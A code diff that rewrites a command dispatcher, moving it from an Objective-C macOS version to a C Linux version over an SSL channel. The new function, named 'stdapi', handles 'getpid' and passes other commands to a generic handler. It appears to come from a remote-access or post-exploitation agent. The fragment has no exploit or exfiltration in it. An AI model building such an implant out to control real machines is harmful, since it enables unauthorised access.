@@ -22,18 +22,17 @@
 * SOFTWARE.
 */
 
-#import <Foundation/Foundation.h>
+#include <string.h>
 
-#import "macos/commands.h"
+#include <openssl/ssl.h>
 
-void handle_command(int channel, char *cmd, char *args)
+#include "generic.h"
+#include "linux/commands.h"
+
+void stdapi(SSL *channel, char *cmd, char *args)
 {
-    Commands *commands = [[Commands alloc] init];
-    commands->channelPipe = channel;
-
-    NSString *command = [NSString stringWithFormat:@"%s", cmd];
-    NSString *argv = [NSString stringWithFormat:@"%s", args];
-
-    if ([command isEqualToString:@"getpid"])
-        [commands cmd_getpid];
+    if (strcmp(cmd, "getpid") == 0)
+        cmd_getpid(channel);
+    else
+        generic(channel, cmd, args);
 }
